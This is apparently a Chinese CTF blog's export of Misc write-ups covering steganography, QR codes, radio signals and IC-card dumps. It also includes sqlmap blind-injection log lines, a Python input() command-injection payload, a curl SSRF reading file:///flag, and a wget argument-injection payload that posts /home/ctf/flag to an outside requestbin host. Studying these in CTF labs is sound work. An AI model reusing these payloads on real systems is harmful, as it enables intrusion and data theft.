/flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C6%2C1%29%29%3D109--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C7%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C8%2C1%29%29%3D121--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C9%2C1%29%29%3D105--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C10%2C1%29%29%3D121--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C11%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C12%2C1%29%29%3D104--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C13%2C1%29%29%3D101--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C14%2C1%29%29%3D105--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C15%2C1%29%29%3D49--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C16%2C1%29%29%3D57--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C17%2C1%29%29%3D54--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C18%2C1%29%29%3D53--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C19%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C20%2C1%29%29%3D101--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C21%2C1%29%29%3D55--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C22%2C1%29%29%3D53--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C23%2C1%29%29%3D54--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C24%2C1%29%29%3D57--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C38%2C1%29%29%3D125--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot; 提取出来保存为data.txt，脚本解码处理 from urllib.parse import unquote with open('./data.txt') as f: lines = f.readlines() for line in lines: line = unquote(line) line = line[line.find('))=')+3:line.find('--')] print(chr(int(line)),end=&quot;&quot;) 脚本的功能是读取每一条盲注的记录，并且url解码处理，使用find方法去掉无关的字符把flag输出出来 flag{mayiyahei1965ae7569} 神秘压缩包 解压，得到一个压缩包和一个txt，txt内容是base64转图片，得到解压密码：asdfghjkl 解压得到160张二维码图片，使用微微二维码批量扫描生成一个excel，提取其中内容，都是0和1，二进制转字符串得到flag 赢战2019 下载附件，一个jpg，丢winhex看，正常尾巴，binwalk看有些图片，foremost出一张二维码，扫出:眉头一皱，发现这张图片没这么简单，stegsolve改滤镜看到flag ","link":"http://ayanagi.fun/BMZCTF/"},{"title":"CTFWshow DJBCTF大吉杯 部分misc 复现","content":"十八般兵器 hint1: JPHS hint2:用notepad++打开试试？ hint3:前十种兵器对应10进制，后八种兵器对应8进制 附件是一个rar，解压密码在里面的描述 解压之后里面是18张兵器的图片 一开始复现的时候芙头芙脑的，按照了文件的顺序去排武器数字，这是第一个坎 在题目描述中有正确的顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙 使用JPHS对18张图片解密，密文为空，解密后的18个文件分别丢进winhex，尾部都有一串数字，分两组全部写到记事本里，10进制转16进制，8进制转16进制，转换的过程中找了一些垃圾在线转换网站不支持大数，把我搞迷糊了，最后找到了个很好的在线进制转换，能解决js的大数精度问题，丢连接https://tool.lu/hexconvert/ 把两组16进制组合起来转换字符串 flag{CTFshow_10_bA_Ban_b1ng_Q1} 请问大吉杯的签到是在这里签吗 附件1.png，一个二维码，扫了没什么信息，binwalk，得到2.png，扫，得知是岔路。继续binwalk，到了4.png没了，扫，走到了死胡同。回到2.png，stegsolve滤镜，又得到2幅不同的二维码，扫，都是一样的结果，当时没往下想，果断放弃。(其实是被签到题的200多个解和这道题的个位数个解认为它确实很难而劝退) 把这两张二维码保存，使用imagecombine模式 第一个就是XOR就能发现猪圈密码 直接出来了 牛年大吉 hint1:不要格式化哟，看看引导扇区是不是丢东西了 hint2:压缩包密码在图片文件头里 一个vhd文件，使用R-Studio装载，恢复出一个7z和一个png png的文件头是89504E47直接得flag 童话镇 hint1:离别 hint2:思念 hint3:爱 hint4:印象 先binwalk出一个zip，爆破得到2个txt，看不懂。看wp，第二个我遇到的机器学习题目，看来做misc的不会点机器学习还做不下去了。 脚本是抄7月师傅的 import numpy as np from sklearn.neighbors import KNeighborsClassifier from ast import literal_eval from PIL import Image x_train = [] y_train = [] x_test = [] f1 = open(&quot;t.txt&quot;,&quot;r&quot;) f2 = open(&quot;flag.txt&quot;,&quot;r&quot;) while 1: s = f1.readline() if not s: break s = s.strip('\\n') p1 = literal_eval(s.split(&quot;\\t&quot;)[1]) p2 = literal_eval(s.split(&quot;\\t&quot;)[0]) x_train.append(p1) x_test.append(p2) #print(x_train) #print(x_test) while 1: s = f2.readline() if not s: break s = s.strip('\\n') s = literal_eval(s) y_train.append(s) #print(y_train) x_train = np.array(x_train) y_train = np.array(y_train) x_test = np.array(x_test) clf = KNeighborsClassifier(n_neighbors = 1) clf.fit(x_train, x_test) y_test = clf.predict(y_train) f3 = open(&quot;3.txt&quot;,&quot;w&quot;) for i in y_test: f3.write(str(y_test[i])) f3.close() 得到全是1和0的文本，继续抄脚本 from PIL import Image #import必要的库 fp = open(&quot;3.txt&quot;,&quot;r&quot;).read() #读取文本 pic = Image.new(&quot;L&quot;, (len(fp)//79, 79)) #创建一张图片叫做pic，mode是L，L代表8位像素，是黑白的，size属性是len(fp)//79,79，意思是宽度是len(fp)//79，也就是文本的长度整除79的结果，高度是79 i = 0 #定义一个计数的变量i for y in range(79): #纵坐标从0到79进行循环,也就是从底部开始画起，绘制79单位的内容 for x in range(len(fp)//79):#横坐标从0到len(fp)//79进行循环，也就是从左边开始画起，绘制len(fp)//79单位的内容 if fp[i] == '0':#文本第i个字符如果是0 pic.putpixel([x,y], 255)#那么pic这张图片就调用putpixel这个方法，在[x,y]这个坐标放置一个255颜色的像素，也就是白色 else:#文本第i个字符如果不是0(其实非0即1) pic.putpixel([x,y], 0)#那么pic这张图片就调用putpixel这个方法，在[x,y]这个坐标放置一个0颜色的像素，也就是黑色 i += 1#对这个字符的安置操作已经完成了，i增大1来准备对下一个字符进行操作。 pic.show()#完成上述循环后，图片已经画好，pic这张图片调用show这个方法，也就是显示在显示器上让用户看到。 机器学习可以留后再学，但是画图脚本还是得掌握一下，仔细解释了一下脚本。把python学成文科。只有我这么蠢的人才会这么学习吧。(PS:其中直接偷脚本在kali里跑最后图片show不出来，但是kali里又装好了库，我只能在windows下装库，用的pycharm装库就很难受，这题复现出来问题不大，但是装库的时候可让人抓狂了。) flag{67373永生_举报狗必须死} ","link":"http://ayanagi.fun/CTFshowDJB/"},{"title":"*CTF misc 部分复现","content":"signin 签到题，加入他们的telegram群组就能看到公告上的flag了，记得挂代理 MineGame 扫雷，需要有matlab环境才能打开，非预期解是CE的advance options暂停游戏，之后慢慢在内存里搜索*CTF的unicode编码，跟踪搜索到的地址就能找到flag。 官方wp的预期解是写一个14秒内自动完成扫雷的脚本，对我而言一听就挺难的。 puzzle 图像是竖着25小格，用高度除以25，就得到每一小块是43像素，用宽度除以43就能得到44格，43*25=1100个小碎片。 gaps --image puzzle.png --generations 30 --population 1100 --size 43 --verbose generations是迭代的次数，一般是30，不过这题到了10代之后就不会再有变化了，verbose是让它保留每一代的结果让我们查看对比用的。 (悄悄说一下这么跑是跑不出来的，得用ps改下对比度让图片上flag的墨渍更加凸显便于gaps认图，就不折腾了) littletricks 官方wp里没找到附件，只有文档 看强队wp，这个是windows磁盘镜像，使用磁盘管理加载，解密bitlocker，使用bitcracker爆破或者弱口令社工，密码是12345678，打开后只找到一个password.txt 用磁盘恢复软件例如DiskGenius或者R-Studio恢复，在$RECYCLE.BIN下能找到两个pdf文件，一个是假flag，另一个是真的。 ","link":"http://ayanagi.fun/starctf/"},{"title":"杭电0rays 2020招新赛Misc 复现","content":"test your nc 需要拥有shell的基础知识。当时是没有的，签到都出不来。 nc上去之后ls 之后发现输啥都不好使。 看wp才知道用的是echo语句读取flag nc之后 bash for s in $(&lt;flag); do echo $s; done 我要成为神奇宝贝带师 下载gba模拟器，附件后缀要改成gba才能读取，随便玩了一通，其实没啥意思。地上比较突出的草丛就是flag的字母。 使用口袋妖怪地图编辑器advancemap 从3.0开始打开地图，(图中flag字母我已经涂黑处理) 按顺序可以得到I_LvPeo4mok 需要自行结合hint：flag是15位，并调整位置使其可读。 I_Love_Pok4mo，其实这个4蛮神秘的，因为pokemon的4位置其实是e字母。不太像是能用4代替的样子。组合完发现少2个，在几百张地图里找了n久，最后找到是在最后面 挺脑洞的一道题，并不能学到什么。 who is killer 下完附件丢winhex看，看不出什么。binwalk发现图里藏了一张图。分不出来，使用foremost分出来，一张密文图片，原图改宽高得到hint：z-340，google查询，得知是黄道十二宫杀手的密码，各种报道吹的玄乎得很，恰逢当时没什么想法做题，就没往下做了。 通过wp学习到340是一个矩形信息，将密码分为3个部分，第一部分和第二部分为9行，最后一部分为2行。 只要按照第一部分去做就行了。走法是：从第一个字符开始，图中为h，向下一格，向右两格，得到e，以此类推，走到最右下角的话就继续反复，又从左上角开始，最后一行的下一行是第一行，回到第一行；最右边一列的再右边两列是第二列，那么o的下一个字符是y，以此类推。 helloboysandgirlsiamzodicakillercongratulationonfindmethisisyourflagzpggisthefinallybigboss 其实有个非预期也不用读这么多，直接找f以及下三个字母能组成flag的，以此为基础继续往下读就能减少很多工作量(不会写脚本是这样的了) flag{zpggisthefinallybigboss} verylow 显然的b64转文件，解码后是504B开头，转成zip，解压出来一个woshishui文件，然后就不会了。wp说是将全文件反转后看到bmp的头，但是并没有说如何反转，难道就是16进制逆序？但其实不然，因为在winhex里看它的尾巴并不是逆序的bmp文件头，只好搁置。 询问得知，反转意为让文件与FF异或，丢cyberchef处理。大厨yyds！得到一张bmp。首先要知道silenteye里有verylow解密，才能由题目名的verylow知道使用silenteye解出来 flag{s1lent3ye_1s_s0_c00l} IC 两个dump文件，无从下手。 前置知识：最普通的ic卡有16个扇区（0-15），每个扇区⼜分为4个区域块（0-63）， 每个扇区都有独 ⽴的⼀对密码keyA和keyB负责控制对每个扇区数据的读写操作，keyA和keyB分布在每个扇区 的第四块中。第0扇区的第⼀个数据块，存储着IC卡的UID号，其他扇区可以存储其他的数据， 如钱等数据。 看wp，全丢进winhex里，在菜单里点查看→同步和比较 根据题目描述，变动的东西肯定就是金额，分析后发现第⼀个⿊⾊块和第三个数值是相同的，实际上就是存的⾦额，这⾥需要稍微查阅些 资料或者经验，⾦额再ic卡中⼀般是以分为单位，⼩端序存储，图示2.dump数据为8c6e，转 换成0x6e8c，28300，也就是283元 第⼆个⿊⾊块数值其实是第⼀个⿊⾊块数据的取反，8c6e取反为7391，这⾥⼀般是为了校验⽤ 同理按照上⾯的⾦额的校验⽅法，将第⼆个框内数据取反试试 其实题目有些误导性，但也是没办法，芙头芙脑去做的话会把第一个块去取反，就拼不出来了，按wp描述就是将第二个块取反，最后拼出flag flag{Y0u_hAcK@d_H6Us_Sy5tEm} ","link":"http://ayanagi.fun/0raysCB2020/"},{"title":"2020纵横杯 Misc wp+复现","content":"自己只出了签到题。 签到 自己写的脚本，感觉蛮不错的。 写了有一会儿。大概半小时(老菜了 s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, 0o155, 0o145, 0o137, 0o164, 0o157, 0o137, 0o62, 0o157, 0o156, 0o147, 0o137, 0o150, 0o63, 0o156, 0o147, 0o137, 0o142, 0o145, 0o61, 0o175] s2 = [] for i in range(len(s1)): s2 += [chr((s1[i]))] for i in range(len(s2)): print(s2[i],end = '') My_Secret 当时拿到附件一通操作啥也没出来，放弃。 通过强队wp复现： 首先是lsb隐写，有专门的脚本，叫cloacked-pixel，由于寒假我回了家用台式机重新配的ctf环境，配这个配了好久 python2 lsb.py extract stego.png out 123456 cat out 得到密码38d668578a3686ab wav音频隐写的话常用的工具是deepsound，得到第二个密码carrier。学习了。 接下来图片的加密，看天璇队的wp他们走了不少的弯路，其实无非就是拼积累一个个试呗。希望我能加快积累的速度。 使用的是oursecret，一般人根本想不到。 babymaze2_beta 该稍微学习一下如何使用nc了，直接下载附件操作会遇到各种各样的问题。nc的话就很方便。 nc 182.92.203.154 10001 maze的界面要求的操作应该给的是input()函数，看wp学到一个input()的非预期输入， __import__('os').system('ls /') 等价于 import os os.system(&quot;ls /&quot;) 会ls出一系列文件，其中有flag，那么payload必然是 __import__('os').system('cat /flag') 马赛克 https://github.com/beurtschipper/Depix 将附件图片放进Depix文件夹下，在Depix文件夹里的images/searchimages里把debruinseq_notepad_Windows10_closeAndSpaced.png复制到Depix文件夹里，打开终端输入如下命令 python3 depix.py -p mosaic.png -s debruinseq_notepad_Windows10_closeAndSpaced.png 跑了一会儿得到output.png，当时我读了好久没读出来那个关键的地方是什么字母，遍历试了可能性交上去也是wa，就很难受，最后还是没出。看wp的时候拍断大腿。但是隐约记得我输过a还是错了(?) magic_download run.sh文件内容如下 代码的大意是读取你输入的ip，判断ip是否合法，合法后执行./wget -P /tmp $IP这条语句 使用的是echo语句，那么就可以用-e参数来实现转义并且构造命令输入，传入\\n来绕过ip的判断 绕过后就可以传参到wget了 环境已经关了，别人的wp payload如下 -e tries=20 --post-file=/home/ctf/flag http://http.requestbin.buuoj.cn/w9gw6tw9 \\\\n127.0.0.1 问卷调查 有手就行 ","link":"http://ayanagi.fun/ZONGHENGCUP2020/"},{"title":"DASCTF x BJD 12月圣诞狂欢赛Misc wp","content":"马老师的秘籍 一个靶机，一张几十个二维码的大图，随便扫了一个发现是mbg的语录其中3个字，一开始想弄下来切开一个个扫，以为flag就在这里面。但是太蠢了，所以果断把图片保存下来，是个png。丢winhex，好的，有压缩包，那么直接binwalk，在kali里打开压缩包是归档损坏状态，binwalk出来的两个txt文件都是空的，尝试把压缩包拿出windows查看，有三个文件，一个GoodLuck.txt，一个闪电五连鞭.txt，还有一个马老师的磁盘.jpg，压缩包带密码，尝试全部的伪加密，发现jpg是伪加密，图片长得和png几乎一样，然后有明显的需要处理的痕迹，其他俩带密码，jpg解压出来stegsolve和png异或，发现 把NianQingRenBuJiangWuDe丢去md5加密，直觉是取32位小写 c57988283c92f759585a0c1aebfdd743 将两个txt解压出来，一个内容是 另一个内容是 一看就知道是Ook，批量替换之 DASCTF{f79f28f30232e26a2f51b6b75355afa9} 交了好几次发现都错了，一看公告发现不需要带上DASCTF{}。 FakePic 下载下来是RAR文件，打开发现提示密码是1???，马上想到掩码爆破，但是是高版本加密，archpr无法爆破，rarcrack没爆出来就离谱，明明字典里面没错。随即找了另外的rar暴力软件，而且挺好用的：cRARk。 password.def的内容如下： max=4 ## [$a $A $1] * 爆了十几分钟出来了，密码1cpp，解压，一个png，一个txt，hint看不懂。 png用zsteg看，有些文件，也看不懂。 但是有一行：searchme_in_Alpha stegsolve打开，alpha7个滤镜，在最左边能看到一些类似摩斯电码的东西， 当时我的表情就是这样的， 图片旋转之后放大五倍，是这样的结合hint:10132430， 可能是把这些码按照滤镜1 0 1 3 2 4 3 0的顺序抄下来排列，抄完之后解摩斯电码，不对，但是有一些类似url的转码字符。感觉又有希望，但是觉得又不像摩斯码，不知道是啥了，最后放弃，等官方wp。 http://www.7yue.top/2020-dasctfbjd-miscwp/ 题目没了而且也懒得复现了，直接贴大师傅的wp。 FakePixel 下下来一个超大的压缩包，解压的bmp一张半个G，还有个enc.py的加密脚本，大眼一看，不会做，直接等wp。 不过从大佬wp里学到了VBS的解密、maxicode、CitrixCTX1加密，以及相见恨晚的cyberchef工具，还有针对mp3的private_bit加密，都是没见过的新东西，在知识的海洋里乱游。 总结 还要继续努力。 ","link":"http://ayanagi.fun/DASxBJD1225/"},{"title":"SWPUCTF 2020-Misc WP","content":"有一定难度，但不是不能做，其实misc难度还算适中吧，只是都是套娃 耗子尾汁 binwalk出一个mp4视频和一个压缩包。扔进vegas逐帧查看，发现一串base64解得压缩包密码sign_in 得到一个txt，文件名是19_20.txt，应该是提示，但是我看不懂，后来才知道是仿射，还是见识过于短浅了。 里面是一串b64以及The last layer is the single table replacement password的hint 解b64，转字符串，第一次从单表替换这个概念去了解密码，无脑使用凯撒栅栏这些没有任何结果。去quipquip，没整出来，因为不会用。看flag的格式是带下划线的，但是也不会整。 就差一点就出了，真的很急很气。 后来询问@Hh0师傅，最后是给那串东西按照给的格式添上下划线才能解出来。 套娃 非常简单的excel，都知道excel能改成zip解压，解压出一个txt和另一个excel，看文件名知道是RC4，excel继续改文件名解压，得到一个加了密的key压缩包和又一个excel，这次这个excel解压没啥用，扔winhex看到尾部的密码，解压得到key，RC4解密 找找吧 压缩包丢进winhex得到key，解压得一个mp3和一个rar，mp3扔audacity没用，winhex看是rar，改后缀解压出一个mp3和一个png，au打开mp3后面有摩斯电码，解出一串东西，就卡住了。 后来群里讨论说是md5，找半天md5解码，要么要钱要么失败，头都秃了。没做出来 后来在各方帮助下在somd5上解出n1ce_try 一个gif和一个png stegsolve逐帧播放，看到类似flag的内容，png很明显的改宽高，发现提示 Veni,Vidi,Vici搜了知道是凯撒，凯撒可以得flag。 来猜谜了 png一张，stegsolve LSB隐写了一个压缩包，丢kali zsteg提取 zsteg extract &quot;b1,rgb,lsb,xy&quot; problem.png &gt; flag.zip 一个流量包一个图片，usb流量分析，tshark没提取成功，然后就做不下去了。报错如下 直到刚才有师傅告诉我T需要大写。我真是傻到家了。 看别人的wp： 提取得到的是 AG DX AG DX AG DX 查了半天是解密 AGDFVX 密码的 phqgm 表，得到 gogogo然后就卡了，真的没碰到过有密码的图片隐写 搜了搜有个 steghide 和 outguess，最后是用 outguess 解出来的 我结合官方wp的补充：键盘脚本。 得到字符串 AG DX AG DX AG DX ，是一种用ADFGX编码方式加密的字符串。通过对照表可以得到明文：gogogo，为outguess的密钥。 ","link":"http://ayanagi.fun/SWPU2020/"},{"title":"RoarCTF 2020-Misc wp","content":"wp部分转自 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485804&amp;idx=1&amp;sn=15b8b99fc9cdca98d5fa99484b776063&amp;chksm=fd711c21ca0695374a191994b75b563b1a7604b70aa3c0b0251e78721f5a24de8ff85f85284f&amp;mpshare=1&amp;scene=23&amp;srcid=1207vysHlxNfj0iTwS4Fq5Xw&amp;sharer_sharetime=1607348906792&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd 华丽丽的爆了零。 仰慕着夏风师傅对Roar2019的精彩wp，自己做BUU也遇到了相同的题，难度不高，然后小瞧了今年的。 只对misc有了解，web大概只有F12和GET/POST的水平，然后签到出不来，签到是个披着misc皮的web。 签到 &lt;?php echo &quot;&lt;!-- /?url= --&gt;&quot;; if ($_GET['url']) { if (preg_match(&quot;/flag/i&quot;, $_GET['url'])) { die(); } $curl = curl_init(); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_TIMEOUT, 500); curl_setopt($curl, CURLOPT_URL, $_GET['url']); $res = curl_exec($curl); curl_close($curl); echo $res; } //47.104.232.98:39390/?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37 //flag{c8ff10a5edb8acb9d8ef20f8eeba19a6} Hi 433MHz 无线电流量分析，一看就不是我能做的题。但是看完wp乍一看也不是很难，只是第一次看见，不会分析罢了。 以下是北极星战队的wp： 汽车钥匙信号〜433Mhz。车钥匙信号的前导码是稳定的数据流，可以向接收者显示出实际正在被接受的数据。使用/inspectrum波形分析工具，symbols设为8个后，做相应调整，打开add sample plot选项 我们要关注的是蓝色的波形，如果波形比较密集就代表1，比较稀疏就代表0 然后就是慢慢的记录0、1二进制，转为ascii码就是flag flag{25c21b0d-6a11-4312-971b-428d01cdc534} 后记：其实上面的是小题大做了。 刚刚看了别人的wp，直接扔进audacity里像数摩斯电码一样数就行，只不过并不是转成字符串，而是短为0长为1的二进制转ascii FM 抄别人的wp： 题目给的附件是一个iq格式的文件，然后通过题目附件名称给的提示是rate=2MHZ， 87-108MHZ有点东西，于是就找了很久资料，发现有一个工具gqrx-sdr是专门分析FM调频的，先安装这个软件在kali，然后打开软件设置这些参数，写入文件路径，和Bandwidth设置2MHZ，接着在里面的右边mode模式设置WFM(mono)，然后就可以听到出题人在读flag，这时只要慢慢听就能听出来flag flag{82c83416-dadc-4947-80df-b84852b8f35d} ","link":"http://ayanagi.fun/Roar2020/"},{"title":"C1CTF 2020-Misc WP","content":"BehindMe 一看就知道是NTFS数据流隐写，盲猜隐藏的文件就是flag.txt 直接 notepad behindme.txt:flag.txt flag的痛 音频文件，直接扔audacity，调高频率就能看到flag 呜呜呜 winhex打开，尾巴看到7z文件，复制那部分粘贴进010保存或者dd得到一个7zip，ARCHPR无法爆破，搜了一下爆破7z文件的方法，弄了个软件给我爆出来口令是1，但是是错的，之后丢进kali rarcrack 1.7z --threads 4 --type 7z 放着爆了半天然后挂起了，心态炸了就没去做，看了hint是弱口令，但是也懒得去试，然后没出。 一看官方wp其实就是123456，有点遗憾，这么简单的题目都没出来 forever c1 第一次见识，但是也不算第一次。使用curl发送请求在之前hackergame是有过例子的，只是不知道，也没做。 以下是官方wp： 指定本地客户端口号访问指定网址即可，比如使用curl curl 192.168.31.198:30000 --local-port 193 如果发现不可以，可能是因为 NAT 端口映射的原因，建议使用公网服务器。 当然，你也可以使用其他方法，比如： 使用 C/C++/Java/Python 的 Socket 编程，指定本地端口 使用 Scapy 直接构造数据包 使用 IPTables 等工具映射本地端口 科学炼丹 看都没看，机器学习就离谱。 以下是官方wp： 考察点：jpg文件头、深度学习框架使用/图片相似度比较 首先下载下来压缩包，可以看到test和train文件夹，并且train的每个图像文件名就是该图片上的字母，test的图像名称是从0开始编号的，对文件头比较敏感的同学应该能发现0.jpg和1.jpg两张图片结合起来是jpg的文件头FFD8FF 方法1 第一种想法就是把这个题归类成一个机器学习的任务，train中给出了图像和它们对应的标签，所以这是一个有监督的机器学习任务，大致思路如下： 首先将train中的图像（大小20050）分割成小份（4份大小5050），放到对应标签的文件夹下 通过已分割的图像和标签训练出一个模型，然后识别出test中每张图片上的数字的内容 将识别出的结果严格按顺序排好，以16进制形式写入文件当中，就可以得到一张jpg图像 最后得到的jpg图像就是flag： 方法2 如果仔细观察一下给出的图像，会发现这里面每个数字或字母对应的图像都是一样的，并且相互之间有明显差别（肉眼就能分辨出来），所以还可以用另一种方式，就是图像相似度的方式来进行识别，通过对比test中每个分割后图片和train中有标签图像的相似度，确定test中图像的标签，然后写成图像 